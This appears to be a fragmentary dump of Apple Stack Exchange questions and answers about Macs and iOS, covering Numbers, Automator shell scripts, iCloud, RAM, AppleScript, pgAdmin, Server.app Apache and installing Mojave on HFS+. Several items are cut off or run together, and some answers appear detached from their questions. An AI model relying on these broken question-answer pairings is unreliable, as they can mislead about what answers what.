columns 1 and 2. In other words, I would like to swap columns 2 and 3. This is possible in Microsoft Excel.\nI realize this is possible in Numbers by creating a dummy column and copying/pasting, but this doesn't seem like the \"proper\" way to swap two columns. Additionally, this creates problems if there are other columns/rows which reference these rows which are being swapped. \nIs there a way to swap rows/columns in Numbers while maintaining these references?\n\nA: Your question has already an answer here.\nAdditionally this can also be done by clicking on the column/row number one time (it should be highlighted), then long-click it until the column/row begins to float. Now you should move and reorder without deleteting references.\n", "Q: Use Automator to copy multiple folders with different amounts of folders while removing parent folder \n*\n\n*copy whats within the red box(images folder too with content) into the blue box and delete the folders.\n\n*the remaining result will then be SIZExSIZE - > sizexsize.file etc.. and images folder with images.\n\n\nA: To make sure The problem statement is clear, let’s assume:\n\n*\n\n*You have a number of folders named using the format 123x456, e.g. 300x250, 728x90, etc.  These are all contained in a single, top-level folder with some arbitrary name, e.g. 01_FILE_NUMBER (unimportant);\n\n*Each folder named like 123x456 contained a single folder called folderA, and nothing else;\n\n*Each folder called folderA contains a single folder called folderB, and nothing else;\n\n*Each folder called folderB contains a single folder named identically to the 123x456 second-tier folder that contains this branch of the directory sub-tree, e.g. 728x90;\n\n*Finally, these bottom-tier folders contain a .PNG image file whose filename is identical to the parent folder, e.g. 728x90.png;\n\n*Summarising all of this: all .PNG image files have a path of the form 01_FILE_NUMBER/728x90/folderA/folderB/728x90/728x90.png.  Importantly, folderA has no siblings, and folderB has no siblings, i.e. they reside in their parent directory by themselves.\n\nAssuming this is accurate...\nI would do the bulk of the file and folder processing with a Run Shell Script action (use the following options: Shell: /bin/bash, Pass input: as arguments):\n\nBreakdown:\n① This workflow asks the user to locate the top-level directory that contains the folders to be archived.  Using the example name from above, the user would navigate to the folder 01_FILE_NUMBER; double-click on it; then click \"Open\" to beginning processing of its contents.\n② A shell script processes the folder's contents as follows:\n\n*\n\n*The entire top-level folder and its contents are copied to the desktop, which is where you stated you want the final archive to reside.\n\n*Processing is done using this desktop copy, leaving the original untouched.\n\n*All folders three-tiers deep are moved up a level.  To illustrate this, consider the example path 01_FILE_NUMBER/728x90/folderA/folderB/728x90/728x90.png: the tier 1 folder is 728x90; the tier 2 folder is folderA; the tier 3 folder is folderB.  All folders called folderB reside at this third-tier level.  They are then moved up one level, and will now reside in the same folder as folderA, at tier 2.\n\n*All folders two-tiers deep that are not named folderB are deleted.  This will delete the now-empty folderA folders.\n\n*The final folder structure now looks like this: 01_FILE_NUMBER/728x90/folderB/728x90/728x90.png.\n\n③ A .zip archive is created on the desktop using the same name as the original top-level folder, i.e. 01_FILE_NUMBER.zip.\nHere is the bash source code to copy-n-paste:\n    cp -R \"$1\" ~/Desktop\n    cd ~/Desktop/\"$(basename \"$1\")\"\n    find . -type d -depth 3 -execdir mv {} ../ \\;\n    find . -type d -depth 2 ! -iname \"folderB\" -exec rm -R {} +\n    pwd\n\nOptionally...\nThe desktop will have both the copied top-level folder and its archived form.  You can now safely delete the uncompressed folder from the desktop (the original is still safe in its original location) and keep only the archive.  To do this, append a final Run Shell Action at the end of the workflow, using the same Shell and Pass input options as before, and enter this source code:\n    f=\"$1\"\n    rm -R \"${f%.*}\"\n    open -R \"$f\"  # Reveals the archive in Finder\n\n\nWarning: Test this workflow with a sample set of files and folders until you're satisfied it does what you want.  The workflow permanently deletes folders, and these are not recoverable.\n", "Q: Fix the constant shift issue On my Macbook Air A1466 the shift key seems to be constantly pressed, even during boot so it only boots into safe mode because of this.\nThe issue exists both before and after replacing the keyboard with a brand new one!\nThis is what I've tried:\n\n\n*\n\n*Reinstalled MacOS\n\n*Replaced the whole keyboard (painful process)\n\n*Reset NVRAM (alt + cmd + p + r) during startup\n\n*Hooked up an external keyboard (this one works fine, but shift is still held down)\n\n*Tried Keyremapper: https://pqrs.org/osx/karabiner/ which helps WITHIN the OS, but not during boot \n\n\nAny ideas?\nPS: This is not a duplicate of Shift key damaged how to disable it at boot?.

How can I prevent iCloud Drive from downloading files?\nPicture is attached and it shows that some files are downloaded. I want to remove that space that it is taking up on my MacBook.\n.\n\nA: The cloud with an arrow icon means that the file is not currently on your computer. Clicking it downloads it to your computer.\nThere is a setting in System Preferences > iCloud > iCloud Drive > Documents called \"Optimize Mac Storage.\" When this is selected, older files that aren't accessed regularly or recently are removed from your computer, but saved on iCloud.\nThe level to which the files are chosen for optimization is linked to how much free space you have on your Mac. If you have very little free space, many older files synced with iCloud drive will be offloaded from your computer, safely stored in iCloud. If you have a lot of free space, files might never be offloaded.\nIf you disable Optimize Mac Storage, you may run low on or run out of storage space on your Mac.\nThe exact length of time that the file is downloaded to your Mac is a mystery to me. Unfortunately, it's not possible to pick and choose which files you would like to offload, as this is done automatically.\n", "Q: Can i swap memory modules between mac I have 3 mac's \n\n\n*\n\n*Mac Mini 2.4 GHz Core 2 Duo , 2GB 1067 MHz DDR3, \n\n*Macbook pro (15\", Early 2011), 2GHz Core i7, 4GB 1333 MHz DDR3\n\n*Macbook Air (13\" Mid 2012), 2GHz Core i7, 8GB 1600 MHz DDR3\n\n\nIs it possible to use 4GB memory modules from Macbook pro and put it in Mac mini, thus upgrading its memory size. \nIf that works, then i was thinking to taking 8 GB memory module out of Macbook Air and put it in Macbook Pro. \nAnd finally get new 16 GB memory modules for Macbook Air. \nConsidering that all of them require DDR3 , does clock speed cause any issues with working on macs.\n\nA: No, this will not work. Only the RAM for the MacBook Pro and Mac Mini are compatible, as MacBook Airs have their RAM soldered to the logic board.\nWhile you will be able to move the MacBook Pro memory to the Mac Mini, the speed would be slower. Because the RAM is soldered to the logic board of the MacBook Air, this memory can't be moved at all, so you'd still be short new memory.\nIf you want to upgrade your memory in both the Mac Mini and the MacBook Pro, move the sticks from the MBP to the Mini, then buy new ones for the MacBook Pro. If you just want the upgrade in the Mini, buy new sticks for the Mini's specs.\n\nA: Yes that should work fine. You're taking faster memory from the MacBook Pro and putting it into a Mini which can accept slightly slower memory, which means the Mini won't notice the difference and will use the memory as fast as its designed to access it.\nSince the MacBook Air RAM is soldered in place, you're stuck with whatever it has.\n", "Q: How to Sync Messages from iPhone to Other Devices (iOS 11.4, macOS 10.13.5)? With the arrival of iOS 11.4 and macOS 10.13.5, I am looking forward to having messages up-to-date across all my Apple devices. The master set of messages lies on my iPhone which I have had the longest. My Mac only has messages from a certain point, and also has many messages shown in mixed up order. \nI want to be able to use my iPhone message history as the 'master ' message history that will be downloaded to my mac. I fear that if iCloud tries to reconcile my iPhone and mac message history some data will be messed up. There are no messages that are on my mac that is not on my iPhone. So, what are the exact steps I can take for this?\n(I am in the process of updating iPhone and Mac.)\n\nA: My goodness!  200GB!?  Unless you have chosen to put a gargantuan amount of data in your iCloud account, I'd recommend paying $.99 a month for 50GB and seeing if that isn't sufficient.  I have 50GB and have used only 13.4GB so far:  photos & videos, Mail, documents, backups, and Messages.\n\nA: I would recommend updating your iPhone to iOS 11.4 and your Mac to macOS High Sierra 10.13.5 so that both devices can access the new feature called \"Messages for iCloud\". Messages for iCloud will backup your messages from your iPhone to the cloud so you can have them across all devices.\nKeep in mind that Messages for iCloud will take up some storage space depending on the content within your messages. If you value the messages greatly then I recommend upgrading your iCloud storage to 200GB (or more if necessary). That will resolve this issue.\n", "Q: iOS/macOS - Determine Emoji name while choosing Emoji are quite popular now on macOS/iOS along with other software platforms. For many people, they are an integral part of day to day conversation over apps like Messages and WhatsApp.\nHowever, many folks end up using them based solely on instinct rather than knowing their exact meaning/name. There comes the question.\n\nIs there any mechanism to determine the name of an Emoji when entering one, while using Emoji keyboard? Long press comes to mind, but that gesture appears to be reserved for selecting skin tone variation. While Emoji can be searched for using the search bar (In WhatsApp for macOS, which uses the same set as Apple), I am  looking for a way to determine the name for a particular Emoji, while choosing to enter it.\n\nA: In macOS Messages.app, hovering the mouse pointer over an emoji shows its name:\n\n\nA: As answered by @IconDaemon, in macOS, the name of an Emoji can be determined by hovering the mouse pointer over it.\nIn iOS, there isn’t any way to read the Emoji name/description. However, there’s a way to listen to the name of the desired Emoji.\nTo listen to the Emoji name, go to Settings app → General → Accessibility → Speech and enable Speak Selection.\n\nNow, pull up the Emoji keyboard, enter the desired Emoji, and long tap to select just the Emoji. In the menu shown, along with Cut, Copy etc., Speak option is now shown. Tap on Speak item to hear the Emoji description.\n\n", "Q: Is there something special about the .Spotlight directories/data?

(see the magnifying glass on the menubar of your Mac.)  Deleting those indexes will force spotlight to re-index your drive (which is perfectly natural) and it will make a new index, hopefully something small and tidy.  I've no idea why your index is so large and would hope that the new index will take up MBs rather than GBs.\n\nA: .Spotlight-V100 directories are found in the root of each mounted volume.

I need to get a list of all Safari tabs, then filter them down. I was expecting this to be very simple. It's not.\ntell application \"Safari\"\n    set tabSet to {}\n    repeat with w in (get every window)\n        repeat with t in (get every tab of w)\n            set the end of tabSet to t\n        end repeat\n    end repeat\n    --set tabSet to every tab of every window -- a one-liner here would be convenient\n\n    set firstTab to first item of tabSet -- works, see edit\n    set targetTab to first item of tabSet whose name is \"Untitled\" -- this fails\nend tell\n\nFirst of all, every tab of every window returns a nested list of lists of tabs (grouped by window) instead of just a flat list. I just ended up going with repeats. (If there is a way to make this a one-liner, it would be nice). But so far, so good.\nThe result I was getting from first item of tabSet was throwing me off because it looked like it was returning a form of the entire list:\nitem 1 of {tab 1 of window id 15557 of application \"Safari\", tab 2 of window id 15557 of application \"Safari\", tab 3 of window id 15557 of application \"Safari\", tab 4 of...\n\nThe actual problem occurs on the filter line where I try to get the first item of tabSet whose name is \"Untitled\". (Replace with a valid name of course). Then, I get this error:\nerror \"Safari got an error: Can’t get tab 1 of window id 15561 whose name = \\\"Untitled\\\". Invalid index.\" number -1719\n\nEDIT 2:\nI added the following block:\nrepeat with t in tabSet\n    set n to (get name of t)\n    try\n        set targetTab to (first item in tabSet whose name is n)\n        set targetWindow to (first window whose tabs contains targetTab)\n        log (get id of targetWindow) & (get name of t)\n    on error\n        log \"ERROR: \" & n\n    end try\nend repeat\n\nThis revealed that, once again, the problem was not as it seemed, but was actually something completely different:\nOnly tabs in the frontmost window can be filtered. It appears that the statement first item of tabSet whose name is \"Untitled\" fails if the tab \"Untitled\" is in any window other than the frontmost window.\nAny ideas?\n\nA: This is how AppleScript refers to items from lists. You're not doing anything wrong.\nWhen you say ‘first item’ of a list, you get ‘item 1 of {some list}’, that is literally equivalent to the first item in the list as you'd expect it in other languages.\nAll 3 of these are equivalent and refer to exactly the same thing, even though they show differently.\ntab 1 of window id 1\n\nitem 1 of {tab 1 of window id 1}\n\nitem 1 of {tab 1 of window id 1, tab 2 of …, …}\n\nYou can get properties from this item as if it had never been in a list.\n\nset targetName to name of targetTab -- gets the name of the tab\n\nIt may be confusing coming from other languages to see the entire list shown when you just want a single item, but it's likely for performance, since it doesn't attempt to extract anything from the list or even show a different representation of the item just because you don't want to see the rest of the list in some sort of output.\n", "Q: CCC reporting physical problem with a drive volume even though the drive is working I'm trying to create a read-only disk image archive of a High Sierra installation to later clone to other hard drives. I have tested the source drive and it is fine. No failed sectors or other indicators of a failing drive. I used DriveDx to perform these tests.\nHowever, when I start the archive in CCC 3.5.7 on an early 2008 MacBook running Lion, I am greeted with \n\nCCC has detected a physical problem with one of your volumes.\nThe backup task is still running, and CCC will copy as many files as possible.

Will it affect future drive restores from this image archive?\n\nA: In the end, I settled with Disk Utility. I know that CCC is typically faster since it copies in chunks but my goal was to create a one-time archive of an OS and then clone it to other drives whenever necessary so the benefit of CCC is less noticeable.\nI found a forum post on Apple's forum about an issue that seemed similar or possibly the same. The accepted answer to that post suggested the older version of CCC was looking for mach_kernel files in the wrong place on the drive. Apparently, Yosemite and later now keep those files in a different location. Those particular kernel files are crucial to the boot process and the computer will not detect the clone partition as bootable unless those files are there. This explanation might explain my troubles since I'm using CCC 3.5.7 (unsupported) on Lion and the operating systems I was trying to image were High Sierra and El Capitan. Unfortunately, that forum post is lost in my browser history.\nI never did try a new version of CCC because my early 2008 MacBook is incapable of running anything newer and I don't really have access to a newer Mac at the moment. I reverted to using disk utility which worked quite well. I created a read-only disk image and then, when I want to clone, mount the disk image and create a restore from the mounted image to the partition on the target hard disk.\nRunning Lion 10.7.5 on an early 2008 MacBook.

However, if I right-click it and select \"Open\", nothing happens.\n\nThen again, if I try to re-download pgAdmin 4 and drag that into the Applications folder, I get an error message saying that pgAdmin 4 is already in use:\n\nSo how do I 'use' pgAdmin 4? The screenshots on https://www.pgadmin.org/screenshots/#1 suggest that I go to localhost:5050, but that just gives me a 'Connection refused' error. Then again, I seem to recall it working earlier and opening a web UI in a new tab in Chrome, so why am I not seeing that now?\n\nA: I just closed pgAdmin 4 in the Activity Monitor and started it again. Then I see a new tab open up with pgAdmin 4. It apparently is running on a different port (63467) than shown in the screenshots.\n\n\nA: Today is my second day using pgAdmin, I downloaded it yesterday and it worked fine, but today I couldn't find a way to start it up again.\nSolution was this.. I found the downloaded .dmg file again (pgadmin4-3.5.dmg) and clicking on that as I did yesterday, then accepting the warning, it created an .app file same as yesterday (pgAdmin 4.app).  I then copied that file, and pasted it into my Applications folder, which I didn't do yesterday.  \nAfter doing that I can find that .app file with Launcher, click on it, and it opens a browser tab, starts the client, and shows the server connection I created yesterday.\n\nA: Since I like shortcuts then I prepared a solution which opens pgAdmin 4 with a quick Alfred/Spotlight shortcut called db without problems for me:\nAssuming you have pgAdmin 4.app inside Applications folder already then save the following script as db.app and you should be good to go:\n#!/bin/bash\n\n# Kill all possible previous pgadmin processes:\nfor pid in $(pgrep -i pgadmin)\ndo\n  kill -9 $pid\ndone\n\n# Open new pgadmin process:\nopen -a pgAdmin\\ 4\n\nAfter that I could use Alfred/Spotlight search with a keyword db and it starts up new tab with pgAdmin session.\n\nA: I am having a similar issue. I installed PostgreSQL11 and Pgadmin4 on my Mac and both worked absolutely fine. However next day when I started my system, PgAdmin was missing. I couldn't find it anywhere. I could only find the .dmg file, when I clicked on it it went on and did the entire installation again. No error came such as this application is already present or not. Then it worked absolutely fine but next day it went back to the same status. This time I didn't shut down my system and it remained there even after I shut down the server after clicking on elephant icon next to my wifi icon on top right. However when again I switched off the system it went away and I had to reinstall once again. Another thing I noticed is that I can see Postgre SQL in Launchpad but don't see PgAdmin 4 elephant icon in my applications folder too. Neither can I find the PgAdmin 4.app file which most online forums mention as solution to this issue.\n", "Q: brew cask upgrade does not seem to work ~$ brew cask --version\nHomebrew-Cask 1.6.6\nHomebrew/homebrew-cask (git revision 1c78e; last commit 2018-06-01)\n~$ \n~$ brew update\nAlready up-to-date.\n~$ \n~$ brew cask outdated\n~$ \n~$ brew cask info google-chrome\ngoogle-chrome: 67.0.3396.62\nhttps://www.google.com/chrome/\n/usr/local/Caskroom/google-chrome/66.0.3359.181 (2 files, 77.5KB)\nFrom: https://github.com/Homebrew/homebrew-cask/blob/master/Casks/google-chrome.rb\n==> Name\nGoogle Chrome\n==> Artifacts\nGoogle Chrome.app (App)\n\nAbove is the output when I was trying to upgrade google-chrome.

Then plug power in and turn the brightness up. For some drivers, those brightness control don't work, and I've seen drivers that install with brightness set to zero by default.\n\nA: Apparently my Bootcamp Assistant's Windows support folder was wrong, and the graphics drivers broke when it tried to install them.

What is the behaviour if not all devices support Messages in iCloud?\nDo the supported devices sync to iCloud and the older devices continue to receive messages as normal, not synced?\n\nA: That is exactly how it works. The devices that have Messages in iCloud enabled will sync amongst themselves, while older devices will keep working as they always did.\nMore precisely:\n\n\n*\n\n*iOS devices with Messages in iCloud will no longer backup messages as part of iCloud Backup.

They do show as Home Hubs in the iOS Home app, show up as Airplay destinations, and have all other indications that they should work.\nAddendum #2: I factory reset one of the misbehaving Apple TV 4Ks and it allowed proper room selection. It also has a room selection menu in the Airplay settings. The misbehaving Apple TV 4K does not have that menu choice in Airplay to get to any Room settings, so I'll probably factory reset it too.

But to my mind this shouldn't make any difference at all.\nI pass the usb dongle directly into the Guest. No longer having access to this device in the host.\nBelow is what I see:\n\n\n\n\nUpdate\nAfter using an older version of OSx I have got the wireless to work internally. \n\nShowing my setup\n\n\nA: As Allan has mentioned in the comments, what you're trying to do (or perhaps how you're trying to approach this) is not possible.\nLet's assume you're using Parallels (if not, it doesn't matter - this is just an example). And let's assume you're running Parallels on an iMac and you've installed Windows 10 on a virtual machine (again, an example - I know you're talking about an OS X guest). \nNow, for the guest OS (regardless of what it is) to access the internet or a network, it needs to access that network via the host in some way. Typically you'll have options for using a Shared, Bridged or Host-only network. All of these still require the network (or adapter) to be running on the host machine. \nSome tips:\n\n\n*\n\n*If your goal is to connect to the internet from your guest machine, then you wouldn't use the Host-only (or equivalent) option. \n\n*If what you're trying to do is have your virtual machine treated as a stand-alone computer on the network and configured in the same way as a real one, then you'd use the Bridged network option. This allows your guest to access the network and internet using the adapter you've connected to the internet (assuming you've set this up properly on the host machine). Just to be clear, the adapter must be installed, recognised and running on the host machine!\n\n*If you're wanting your guest to share all the network connections available on the host machine (including the internet), then just choose the Shared Network (or equivalent) option.\n\n\nIn my case I always use the Shared Network option in my virtual machines. This allows the Network Address Translation (NAT) feature to work on the virtual machine and is usually the most reliable option (at least in my experience). The only exception to this is if I need a stand-alone virtual machine totally segregated from the internet, in which case I would use the Host-only option.\n", "Q: Is it safe to use 2 Power sources into a MacBook Pro 2016 15\" I have a 4k monitor that has power over usb-c but it is only supplying 15W instead of what it advertised of 60W. So I was wondering if I could charge my Mac with its 87W power supply while having the monitor plugged in with its 15W while I sort out why my monitor is only suppling 15W and not its advertised 60W. Thanks.\n\nA: Yes - that would be just fine. If you notice the battery draining you can always disconnect the display and leave the power connected so it shifts, then re-plug the display. \n", "Q: iPhone stuck on boot screen My non-jailbroken iPhone 6S Plus (iOS 9.3.5) failed to boot up to the lock screen (stuck in apple logo) after the battery was depleted. Hoping to keep my data intact, I have tried several online suggested solutions such as booting it into safe mode (powering on by pressing the power button + volume up button and holding the only volume up button when the apple logo shows) but to no avail.\nI looked at several other solutions such as creating a no erase ipsw but am unsure if this is a safe solution (eg. no malware, will not further damage the phone, bricking the phone). \nHas anyone tried this solution or has any other solutions I could try? Really hoping to keep my data. Thanks in advance.\n\nA: A \"no-erase ipsw\" is used when you want to go from a jailbroken device to iOS without losing data. In your case, you are already on iOS and seeing as how you have eliminated all of the potential software fixes, you most likely have a hardware issue.\nDepending on the problem, the data may be recoverable but it would have to be looked at by a repair shop that specializes in iPhone data recovery.\n", "Q: Refuse to install fonts in MS Word Docs When opening one of my documents in Word 2015 (15.17.1) on MacOS 10.13.2, I'm asked to download a series of fonts including: STHeiti and Osaka.\nI know I could have these fonts installed to make word happy. How to do this was explained in another SO question. \nI have a very small HD however, so I DON'T want to install these fonts. How can I tell word to stop prompting me to do it please?\nSide remark: I am also surprised by the massive amount of space installing these not so well known fonts requires.\n\n\nA: There is no way of bypassing the system. If you have a second hard drive, you can back up data to the second drive (to save disk space), install the fonts, enable them and then DELETE them (in font book), and then restore your files from the external drive.\nNot very convenient, but works.\n", "Q: What is the difference between add to library and add to playlist? On my iPod Touch I can add an album to my library or to my playlist. What is the difference? The iPod also asked if tracks I add to a playlist should be added to my library. What does this mean?\n\nA: Your library is all the media you own or have access to.  A playlist is just a group of media that you put together in a custom order; a subset of all that media.  The songs in a playlist don't necessarily have to be in your library (i.e. songs you access on Apple Music)\nWhen you play songs on shuffle, the iPod will skip any songs that are in a playlist but not included in your library.\nApple explains it like this: \n\nWith Apple Music, when you add a song to a playlist from the Apple Music catalog, you can turn off the option for it to automatically add to your Library. For example, if you create a playlist for holiday music, you can add songs to that playlist without the chance that they'll play when you listen to your Library on shuffle in July.\nAfter you update to the latest software on all of your devices (iOS 9.3 or later, iTunes 12.3.3 or later, tvOS 9.2 or later, and Apple Music 0.9.7 or later on Android), when you try to add a song from the Apple Music catalog to your Library, you'll see a message that asks if you want to add the song to your Library or only to a playlist.\nYou can change the setting to add songs to your Library at any time. When you change this setting on one device, the change applies to all other devices on which you're signed in with the same Apple ID.\n  \n  \n*\n  \n*Go to Settings > Music.\n  \n*Turn off Add Playlist Songs.\n  \n\n", "Q: \"Your full-resolution photos and videos stored in iCloud may not fit on this Mac.\" even with 45 GB of free space on internal SSD Somehow I accidentally activated iCloud Photo Library and about 5 GB of my photos now reside there.

How can I switch to Apache? \nRegards\nSimon\n\nA: How to deactivate MacOS server apache\nThis command deactivates web services\n$ sudo serveradmin stop web\n\nThese commands should unload the launch daemons inside Server app. Following my experience Server Apache takes over as soon as you install server app. Stopping web services in some cases is not sufficient. By unloading the Apache daemon server app is unable to start its Apache.\n$ sudo launchctl unload -w /Applications/Server.app/Contents/ServerRoot/System/Library/LaunchDaemons/com.apple.server.httpd.plist\n$ sudo launchctl unload -w /Applications/Server.app/Contents/ServerRoot/System/Library/LaunchDaemons/com.apple.serviceproxy.plist\n\nWhen configuring Server’s Apache the following configuration files are used.

All these steps will only affect your server web services.\nWith the next Server App web service will be gone.\n\nA: You can compile your own httpd version and make a new LaunchDeamon and point Server App to your httpd in the httpd_server_app.conf: \nServerRoot \"/usr/local/your-httpd\"\n\nDisable the com.apple LaunchDeamon as shown above:\n$ sudo launchctl unload -w /Applications/Server.app/Contents/ServerRoot/System/Library/LaunchDaemons/com.apple.server.httpd.plist\n\nThen load your own LaunchDeamon:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n  <dict>\n    <key>Label</key>\n    <string>org.apache.apache2</string>\n\n    <key>EnvironmentVariables</key>\n        <dict>\n    <key>SERVER_INSTALL_PATH_PREFIX</key>\n        <string>/Applications/Server.app/Contents/ServerRoot</string>\n    <key>SERVER_INSTALL_PATH_MODULE_PREFIX</key>\n        <string>/usr/libexec/your-httpd</string>\n        </dict>\n\n    <key>ProgramArguments</key>\n    <array>\n      <string>/usr/local/your-httpd/bin/httpd</string>\n      <string>-D</string>\n      <string>FOREGROUND</string>\n      <string>-f</string>\n      <string>/Library/Server/Web/Config/apache2/httpd_server_app.conf</string> \n    </array>\n\n    <key>StandardOutPath</key>\n    <string>/usr/local/var/log/apache.log</string>\n    <key>StandardErrorPath</key>\n    <string>/usr/local/var/log/apache.log</string>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <true/>\n  </dict>\n</plist>\n\n\nVerify that the path prefix keys for the modules are correct. Logs else give you a pretty easy output where to adjust the httpd_server_app.conf. \nLazy version: If the prefix is not working or for some apple only modules: copy&paste them to your pointed folder.\nNow you can use the Server App interface - including the proxy architecture - with your own httpd.\nThe httpd_server_app.conf is overwritten when updating the Server App so keep a copy.\nDisclaimer: This is just showing up a possibility and is not to be seen as advice by any means on how to run a webserver.\n", "Q: How can I prepare for Apple WWDC 2018 event live broadcast and rebroadcast? I expect I will not be able to view the livestream of the WWDC main public keynote event.\nHas Apple announced any plans for non-attendee viewing of WWDC keynote and events?\n\nA: To prepare for 2018 WWDC I would recommend three things:\n\n\n*\n\n*AppleTV and updating it now for the Live Stream and Rebroadcast of the main presentation in the morning and afternoon of the first day. These keynote events are highly viewed and usually available for on-demand viewing and professionally produced.\n\n*WWDC app on the App Store is also very good if you are a registered developer as you can watch many of the sessions live and should expect to be able to rebroadcast.\n\n*Safari web browser is the third best option - in past years -there were not any sort of YouTube or third party browsers.\n\n\nAs to why these three avenues were selected last year is that the sessions under developer NDA require authentication with an AppleID. Also, on a technical level - the streaming used the latest QuickTime codecs for presumable efficiency, quality. Also, there would be marketing synergies of potential value to Apple by using their own technology for a high stakes  / high pressure / high expectations and in demand public event. \nHopefully this helps people prepare for the 2018 remote viewing of the sessions at this year's developer conference.\n—- \nAs a postscript - the WWDC app is showing the live stream on rebroadcast within hours of the main event completing.\n", "Q: Desktop Safari: Disable \"This webpage was reloaded because it was using significant memory\" My computer has 20 GB of memory, but Safari insists on forcibly reloading Slack for using a few hundred megabytes.\nIs there a defaults write command, or some other type of tweak, that can disable or at least raise this threshold?\n\nA: defaults read will tell you what options you can set.\nIt does not appear that there is a defaults write command available as far as I can tell.

I am a software engineer, know Windows very well, and Linux relatively well.\nMost of the guides I found are targeted towards non-technical users.\n\nA: As you are new to Mac and macOS, it is recommended to browse through Apple's official guides. A couple of them are linked below. They cover a lot of advance features and helpful tips for power user:\n\n\n*\n\n*Welcome to macOS\n\n*Meet your Mac\nSince you are also a software developer, it is worth mentioning that macOS is based on BSD and offers a robust UNIX platform. You can also find all the major developer tools build natively for macOS. Command-line experience from using Linux can be easily transferred over. macOS comes with all the major shells (bash, zsh, ksh, csh) preinstalled, and they are accessible via Terminal.app. Bash is the default login shell (just like most major Linux distributions).\nHomebrew, a community developed package manager is widely popular among software developers. It is recommended to have it installed for managing packages. Homebrew also lets one easily install UNIX tools that Apple either don't provide in the default install, or provide an outdated version of. It is comparable to apt-get in Linux.\nHomebrew Cask, an extension of Homebrew project can be used to easily manage installation of GUI applications.\nA very popular and detailed guide for software developers setting up a new Mac can be found here: macOS Setup Guide\nArs Technica has had a tradition of doing a long form review of new macOS release every year.

So:\nxattr -w com.apple.quarantine /Users/username/Desktop/app_name.app\n\nA handy tip if you are unsure about a command is to look up the man page for it.  \nIf you type man xattr it will give you a list of available options for that command with explanations.

Generally, the \"unknown conversion\" message will list the unknown conversion:\n$ dd if=/dev/null of=/dev/null bs=128m conv=noerror,wibble\ndd: unknown conversion wibble\n\nI think what's happening is that the shell parses conv=noerror, sync as two arguments, \"conv=noerror,\" and \"sync\", and then dd parses the first of those as specifying two conversions, \"noerror\" and \"\" (since there's nothing after the comma), and then complains that the option \"\" is unknown.\nBut that's not the error you're getting; yours actually lists \"sync\" as the unknown option. The only thing I can think of is that you might have something like a non-breaking space between the \",\" and \"sync\". In that case, the shell will treat it as just part of the argument, and pass \"conv=noerror,sync\" as a single argument; dd will then parse this as two options, and give the error message \"dd: unknown option sync\":\n$ dd if=/dev/null of=/dev/null bs=128m conv=noerror, sync    # That's a nonbreaking space\ndd: unknown conversion  sync\n                       ^ That's also a nonbreaking space\n\nIn any case, remove the space (whatever it is) and it should work.\n", "Q: Script copy the content of the clipboard into a file I want to write a shell script which copies the contents of the clipboard (plain-text only) when the previous content changes.

At WWDC 2018 macOS 10.14 or macOS Mojave was disclosed.  I am currently on macOS Sierra (10.12) and am looking forward to upgrading to macOS Mojave once its released.  I was wondering if it will be possible to update to macOS Mojave without converting to APFS, similar to this trick from OS X Daily on how to upgrade to macOS High Sierra (10.13) without converting to APFS with the command /Applications/Install\\ macOS\\ High\\ Sierra.app/Contents/Resources/startosinstall --converttoapfs NO.\n\nA: No\n(at least it’s not possible in beta 1)\n--converttoapfs isn’t a recognized option in startosinstall.\n\n\nA: Currently it seems very difficult, but doable to upgrade to Mojave, but not directly.\nCurrently it seems very, very difficult, but doable to update (in) Mojave.\nSimilar to avoiding APFS conversion on High Sierra upgrade, only this time you need to go the clone route. \nBut there are a few catches to this.\nMojave will boot from HFS+, once installed on it.\nThe installer will convert the drive where it is being installed on, no matter what. The command-line option to skip conversion is gone. Apple really wants to enforce APFS adoption.\nThat means you need to install Mojave on a separate volume, which will then be in APFS format. Then you need to reformat your internal main drive that is the real Mojave target as HFSplus. Now clone the external volume to the target.\nReboot into Mojave –– and keep the external drive as a mule.\nSince this is currently the real catch:\nApp Store app (fromerly Software Update) will currently not work when Mojave is booted from HFSplus. It will launch and update properly when running on APFS.\n That means on system updates you need to reboot your APFS mule, update there, then reclone the updated Mojave to your internal work drive (perhaps by inteligently excluding the /Users folder ?).\nIt is unclear what else might break by this method. It seems to run 'fine' in terms of functionality, and it seems to run even better thanks to HFSplus.\nBut the procedure is more than cumbersome.\nApple might do two things in the future:\n\n\n*\n\n*Disable booting from HFS+ completely.\n\n*Enable updating while on HFS+\n\n\nIf you care for the latter, like I do, write to Apple that you want that feature. Fast, Urgently, It's Mandatory. \n\nA: Just follow this post https://www.insanelymac.com/forum/files/file/944-mojave-mbr-hfs-firmware-check-patch/, it works for me and I have the same setup just as you (10.12 preparing for upgrading to 10.14). \nOkay here are the details regarding the link above:\n\n\n*\n\n*Download the attachment named MBR-Auto-Method14-20181003.dmg from the link above (it requires you to log in, and registration is free).\n\n*Open the file you download and unzip OSInstaller.MBR.10.14.0.18A391 inside that DMG file.\n\n*Open Disk Utility, create a new partition at least 2.5GB. This will be used as MBR-installer boot disk later.\n\n*Open unzipped folder double click 14MBRinstallerMaker, input your password to access root. Now drag Mojave installer downloaded from App Store into the Terminal. After that, drag the new partition (MBR-installer boot disk) you created in step 3. And lastly, drag the partition you have installed macOS into the terminal. In this case, the installation would take place in the partition where your macOS installed. Namely, it would upgrade your macOS instead of new installation. Press any key to execute the creation of the installation process and bob's your uncle, fanny's your aunt! It should take you less than 10s to finish it if you were using SSD.\n\n*Now reboot your system and hold option key to boot in 1014MBR18A391. It will automatically finish the rest of the installation.\n\n\nA: YES but not an update... (and really not user friendly)\nThis is actually possible in a weird way, and App Store still works. (managed to install GarageBand, didn't test more complex software)\nHere's the following steps that allowed to get a working Mojave on HFS (and clonable with DeployStudio\n\n\n*\n\n*Get an external harddrive on which you're going to install macOS Mojave\n\n*Boot on the drive, finish the install, create an account\n\n*Restart, make sure everything is working (right now it will be in APFS)\n\n*Plug the external harddrive on a separate machine, and run the Paragon Software APFS to HFS converter (I know it's a third party software, but it's free, and it does the job pretty well)\n\n*Boot on the external drive (now in HFS format)\n\n*Use any imaging tool that works (DeployStudio for me) and copy the image on the target mac\n\n\nAnd voilà ! You now have a working Mojave running on HFS formatted drive. As a bonus, you can even deploy the image with DeployStudio !\nThat might not be the most easiest way to do achieve it, but it does work. (and doesn't crash, so far ?)\n\nA: It could be achieved by removing Harddrive/SSD and installing macOS externally with a USB to SATA cable.\n", "Q: When I set an export PROMPT_COMMAND, it changes my terminal 